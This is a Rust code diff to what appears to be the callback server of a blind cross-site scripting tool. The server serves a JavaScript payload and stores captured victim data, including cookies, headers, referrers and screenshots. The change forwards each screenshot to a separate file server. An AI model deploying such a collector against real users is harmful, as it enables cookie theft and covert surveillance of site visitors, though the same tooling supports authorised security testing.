@@ -5,7 +5,7 @@ use axum::{
     http::{HeaderMap, StatusCode},
     response::IntoResponse,
 };
-use serde::Deserialize;
+use serde::{Deserialize, Serialize};
 use std::net::SocketAddr;
 
 // deliver the javascript payload from GET
@@ -50,6 +50,11 @@ pub struct CallbackData {
     screenshot: String,
 }
 
+#[derive(Serialize)]
+struct FileWrapper {
+    file: String,
+}
+
 // collect info from probe
 pub async fn collector(
     Extension(state): Extension<State>,
@@ -60,7 +65,7 @@ pub async fn collector(
 ) -> impl IntoResponse {
     println!("HIT\nHIT\nHIT");
 
-    sqlx::query(
+    let res = sqlx::query(
         "INSERT INTO pages
             (username, peer, headers,
              uri, cookies, referrer,
@@ -84,6 +89,19 @@ pub async fn collector(
     .execute(&state.db_pool)
     .await
     .unwrap();
+
+    reqwest::Client::new()
+        .post(format!(
+            "{}/{}",
+            std::env::var("FILESERVER_URL").unwrap(),
+            res.last_insert_id()
+        ))
+        .json(&FileWrapper {
+            file: data.screenshot,
+        })
+        .send()
+        .await
+        .unwrap();
 
     StatusCode::OK
 }
